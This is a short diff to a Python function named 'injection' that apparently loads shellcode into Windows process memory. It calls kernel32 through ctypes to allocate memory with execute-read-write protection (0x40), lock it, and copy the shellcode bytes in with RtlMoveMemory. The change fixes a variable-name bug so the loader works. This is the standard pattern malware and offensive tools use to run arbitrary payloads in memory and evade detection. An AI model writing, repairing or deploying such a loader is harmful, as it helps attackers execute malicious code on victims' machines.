@@ -27,7 +27,7 @@ def injection(sc):
                                               ctypes.c_int(0x40))
     ctypes.windll.kernel32.VirtualLock(ctypes.c_int(ptr),
                                        ctypes.c_int(len(sc)))
-    buf = (ctypes.c_char * len(shellcode)).from_buffer(sc)
+    buf = (ctypes.c_char * len(sc)).from_buffer(sc)
     ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                          buf,
                                          ctypes.c_int(len(sc)))
